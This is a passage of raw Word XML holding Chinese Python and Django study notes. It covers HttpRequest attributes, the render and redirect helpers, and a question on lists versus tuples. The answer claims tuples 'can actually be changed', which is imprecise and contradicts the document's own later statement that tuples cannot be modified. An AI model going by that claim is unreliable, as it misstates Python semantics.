          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>二、View视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F2D165" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="00843D31">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视图函数，围绕着两个对象进行：</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E57DBD2" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="00843D31">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1.HttpRequest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B98CFBF" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>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属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40669EAA"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request.path   </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># 获取访问文件路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE1B627"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request.method属性 </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#获取请求中使用的HTTP方式（POST/GET）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D15BA34"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request.GET  </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#  获取HTTP GET方式请求传参（字典类型）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25953409"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request.POST </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#       包含所有HTTP POST参数的类字典对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F9FA42"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request.COOKIES  </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#包含所有cookies的标准Python字典对象；keys和values都是字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C02B0A1"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request.FILES  </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#包含所有上传文件的类字典对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3F1DF5"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request.user  </w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#　是一个django.contrib.auth.models.User对象，代表当前登陆的用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266CF115"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request.session　＃　唯一可读写的属性，代表当前会话的字典对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C698B7F" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2.HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38194AF3" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3"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对于</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求对象来说，是由</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自动创建的，但是，</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响应对象就必须我们自己创建。每个</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求处理方法必须返回一个</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类在</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django.http.HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5D0E84" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="450"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象上扩展的常用方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3602A74F" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="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shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>render(</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>请求对象，</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>'html</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>文件和路径</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>方法，将指定页面渲染后返回给浏览器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED954DF" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>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render_to_response('html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>文件和路径</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>方法，将指定页面渲染后返回给浏览器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1299BA51" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>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redirect('</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>跳转路径和名称</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FF00FF"/>
        </w:rPr>
        <w:t>方法，页面跳转</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8D7DF5" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>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注意：</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两点区别：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0525F341" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>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我们来模拟一个登陆网页，当我登陆成功后，跳转到另一个页面，分别用</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来试试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF1B086" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>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总结两者区别：　　　　</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220DC917" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00337EE3" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>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w:t>
      </w:r>
      <w:r w:rsidRPr="00337EE3">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>第一，</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返回一个登陆成功后的页面，刷新该页面将回复到跳转前页面。而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则不会</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C3E2E4" w14:textId="74BBF329" w:rsidR="00843D31" w:rsidRPr="00113B11" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>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第二，</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返回一个登陆成功页面，不会经过</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路由分发系统，也就是说，不会执行跳转后</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的试图函数。这样，返回的页面渲染不成功；而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是跳转到指定页面，当登陆成功后，会在</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路由系统进行匹配，如果有存在的映射函数，就会执行对应的映射函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED8BF0D" w14:textId="619EC877" w:rsidR="00113B11" w:rsidRPr="00CF0D9D" w:rsidRDefault="00113B11"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151</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>列表和元组有什么区别</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E4270F" w14:textId="4E5F7357" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:r>
        <w:t>答：列表是可变类型，元组是不可变类型，但元组其实是可以改的，只不过默认的不去改</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BB4950" w14:textId="77777777" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>list</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>tuple</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>都是一个可以放置任意数据类型的有序集合，都是既可以存放数字、字符串、对象等</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF833E4" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00990366" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00990366">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>list</w:t>
      </w:r>
      <w:r w:rsidRPr="00990366">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00990366">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>tuple</w:t>
      </w:r>
      <w:r w:rsidRPr="00990366">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>的一些区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEB83A7" w14:textId="740E6879" w:rsidR="00843D31" w:rsidRPr="00990366" w:rsidRDefault="00DA0E72"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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00990366">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>列表是动态的，长度大小不固定，可以随意的增加、删除、修改元素</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65265EA1" w14:textId="32C7B443" w:rsidR="00843D31" w:rsidRPr="00990366" w:rsidRDefault="00DA0E72"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00990366">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元组是静态的，长度在初始化的时候就已经确定不能更改，更无法增加、删除、修改元素</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0932D7"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">tuple </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用于存储异构</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(heterogeneous)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据，当做没有字段名的记录来用；而列表一般用于存储同构数据</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(homogenous)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，同构数据就是具有相同意义的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714EF101" w14:textId="77777777" w:rsid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hint="eastAsia"/>
          <w:color w:val="000000"/>
